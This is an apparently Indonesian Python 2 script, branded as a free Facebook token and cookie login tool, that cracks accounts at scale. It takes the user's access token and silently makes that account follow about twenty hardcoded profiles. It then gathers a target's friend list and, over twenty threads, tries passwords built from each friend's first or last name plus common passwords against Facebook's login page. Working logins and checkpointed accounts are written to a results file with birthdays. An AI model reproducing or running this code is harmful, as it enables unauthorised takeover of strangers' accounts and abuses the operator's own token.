#!/usr/bin/python2
# coding=utf-8

import os,re,sys,itertools,time,requests,random,threading,json,random
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')

# P = '\033[0;97m' # putih
# M = '\033[0;91m' # merah
# H = '\033[0;92m' # hijau
# K = '\033[0;93m' # kuning
# B = '\033[0;94m' # biru
# U = '\033[0;95m' # ungu
# O = '\033[0;96m' # biru muda

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')	

def keluar():
	print ("   [!] Exit")
	os.sys.exit()

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

logo = (""" ==============================

  youtube:IMGAMING (NO SPACE)

   BERBAGI SCRIPT LOGIN COOKIES
   
    && TOKEN ++RECODE GRATIS
  
      kalo recode izin dulu 
       
        biar halal

          087828725073

==============================""")

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
fbid = []

def log_token():
	os.system('clear')
	print logo
	toket = raw_input("   [•]token fb : ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print("   [!] Login Success bro")
		bot_follow()
	except KeyError:
		print ("   [!] Token mu modar")
		time.sleep(1.7)
		log_token()
	except requests.exceptions.SSLError:
		print ("   [!] Kuota mu kayaknya habis")
		exit()

def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("   [!] Token invalid")
		log_token() 
	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100053093889653/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100057755937035/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100002565109395/subscribers?access_token=' + toket)
        menu()
        
def menu():
    os.system('clear')
    print logo
    print ("         [Menu]")
    print ("   [1] Start Crack")
    print ("   [0] Log Out")
    daftar_menu()
    
def daftar_menu():
    	mn = raw_input("   [•] dipilihdipilih : ")
	if mn=="":
		print ("   [!] Isi Yang Benar")
		daftar_menu()
	elif mn == "1":
		crack()
	elif mn == "0":
		print ("   [!] Menghapus Token")
		time.sleep(1)
		os.system('rm -rf login.txt')
		keluar()
	else:
		print ("   [!] Isi Yang Benar")
		daftar_menu()

def crack():
    	os.system('clear')
    	print logo
    	idt = raw_input("   [•] ID Publik : ")
    	try:
		toket=open('login.txt','r').read()
        	pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        	sp = json.loads(pok.text)
        	print "   [•] Nama : "+sp["name"]
    	except KeyError:
        	print ("   [!] ID Publik Tidak Ada")
        	raw_input("   [•] Kembali")
        	menu()
    	except requests.exceptions.ConnectionError:
        	print ("   [!] Tidak Ada Koneksi")
        	keluar()
    	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
    	z = json.loads(r.text)
    	for i in z['data']:
        	id.append(i['id'])

    	print '   [•] Jumlah ID : '+str(len(id))
    	print ("─────────────────────────────────────────────────────────────")
	
    	def main(arg):
        	global cekpoint,oks
        	em = arg
        	try:
            		os.mkdir('done')
        	except OSError:
            		pass
        	try:
            		an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
            		v = json.loads(an.text)
            		bt = v['birthday']
           		pw = v['first_name'].lower()
            		rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
            		xo = rex.content
            		if 'mbasic_logout_button' in xo or 'save-device' in xo:
                		print '   [OK] '+em+' | '+pw+' | '+bt
                		oke = open('result/crack.txt', 'a')
                		oke.write('\n   [OK] '+em+' | '+pw+' | '+bt)
                		oke.close()
                		oks.append(em)
            		else:
                		if 'checkpoint' in xo:
                    			print '   [CP] '+em+' | '+pw+' | '+bt
                    			cek = open('result/crack.txt', 'a')
                    			cek.write('\n   [CP] '+em+' | '+pw+' | '+bt)
                    			cek.close()
                    			cekpoint.append(em)
                		else :
                    			pw2 = v['first_name'].lower()+'123'
                    			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                    			xo = rex.content
                    			if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        			print '   [OK] '+em+' | '+pw2+' | '+bt
                        			oke = open('result/crack.txt', 'a')
                        			oke.write('\n   [OK] '+em+' | '+pw2+' | '+bt)
                        			oke.close()
                        			oks.append(em)
                    			else:
                        			if 'checkpoint' in xo:
                            				print '   [CP] '+em+' | '+pw2+' | '+bt
                            				cek = open('result/crack.txt', 'a')
                            				cek.write('\n   [CP] '+em+' | '+pw2+' | '+bt)
                            				cek.close()
                            				cekpoint.append(em)
                        			else :
                            				pw3 = v['first_name'].lower()+'12345'
                            				rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                            				xo = rex.content
                            				if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                				print '   [OK] '+em+' | '+pw3+' | '+bt
                                				oke = open('result/crack.txt', 'a')
                                				oke.write('\n   [OK] '+em+' | '+pw3+' | '+bt)
                                				oke.close()
                                				oks.append(em)
                            				else:
                                				if 'checkpoint' in xo:
                                    					print '   [CP] '+em+' | '+pw3+' | '+bt
                                    					cek = open('result/crack.txt', 'a')
                                    					cek.write('\n   [CP] '+em+' | '+pw3+' | '+bt)
                                    					cek.close()
                                    					cekpoint.append(em)
								else :
                            						pw4 = v['last_name'].lower()+'123'
                            						rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                            						xo = rex.content
                            						if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                						print '   [OK] '+em+' | '+pw4+' | '+bt
                                						oke = open('result/crack.txt', 'a')
                                						oke.write('\n   [OK] '+em+' | '+pw4+' | '+bt)
                                						oke.close()
                                						oks.append(em)
                            						else:
                                						if 'checkpoint' in xo:
                                    							print '   [CP] '+em+' | '+pw4+' | '+bt
                                    							cek = open('result/crack.txt', 'a')
                                    							cek.write('\n   [CP] '+em+' | '+pw4+' | '+bt)
                                    							cek.close()
                                    							cekpoint.append(em)
										else :
                            								pw5 = 'sayang'
                            								rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                            								xo = rex.content
                            								if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                								print '   [OK] '+em+' | '+pw5+' | '+bt
                                								oke = open('result/crack.txt', 'a')
                                								oke.write('\n   [OK] '+em+' | '+pw5+' | '+bt)
                                								oke.close()
                                								oks.append(em)
                            								else:
                                								if 'checkpoint' in xo:
                                    									print '   [CP] '+em+' | '+pw5+' | '+bt
                                    									cek = open('result/crack.txt', 'a')
                                    									cek.write('\n   [CP] '+em+' | '+pw5+' | '+bt)
                                    									cek.close()
                                    									cekpoint.append(em)
												else :
                            										pw6 = 'bismillah'
                            										rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                            										xo = rex.content
                            										if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                										print '   [OK] '+em+' | '+pw6+' | '+bt
                                										oke = open('result/crack.txt', 'a')
                                										oke.write('\n   [OK] '+em+' | '+pw6+' | '+bt)
                                										oke.close()
                                										oks.append(em)
                            										else:
                                										if 'checkpoint' in xo:
                                    											print '   [CP] '+em+' | '+pw6+' | '+bt
                                    											cek = open('result/crack.txt', 'a')
                                    											cek.write('\n   [CP] '+em+' | '+pw6+' | '+bt)
                                    											cek.close()
                                    											cekpoint.append(em)
														else :
                            												pw7 = '123456'
                            												rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw7, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                            												xo = rex.content
                            												if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                												print '   [OK] '+em+' | '+pw7+' | '+bt
                                												oke = open('result/crack.txt', 'a')
                                												oke.write('\n   [OK] '+em+' | '+pw7+' | '+bt)
                                												oke.close()
                                												oks.append(em)
                            												else:
                                												if 'checkpoint' in xo:
                                    													print '   [CP] '+em+' | '+pw7+' | '+bt
                                    													cek = open('result/crack.txt', 'a')
                                    													cek.write('\n   [CP] '+em+' | '+pw7+' | '+bt)
                                    													cek.close()
                                    													cekpoint.append(em)
																else :
                            														pw8 = 'anjing'
                            														rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw8, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                            														xo = rex.content
                            														if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                														print '   [OK] '+em+' | '+pw8+' | '+bt
                                														oke = open('result/crack.txt', 'a')
                                														oke.write('\n   [OK] '+em+' | '+pw8+' | '+bt)
                                														oke.close()
                                														oks.append(em)
                            														else:
                                														if 'checkpoint' in xo:
                                    															print '   [CP] '+em+' | '+pw8+' | '+bt
                                    															cek = open('result/crack.txt', 'a')
                                    															cek.write('\n   [CP] '+em+' | '+pw8+' | '+bt)
                                    															cek.close()
                                    															cekpoint.append(em)
									
		except:
			pass
	p = ThreadPool(20)
    	p.map(main, id)
    	print ("─────────────────────────────────────────────────────────────")
   	print ("   [•] Crack Selesai")
    	print"   [•] Total OK/CP : "+str(len(oks))+"/"+str(len(cekpoint))
    	print '   [•] Hasil OK/CP Tersimpan Di : result/crack.txt'
    	print ("─────────────────────────────────────────────────────────────")
    	raw_input(" [Kembali]")
    	os.system("python2 exclusive.py")

if __name__=='__main__':
	log_token()
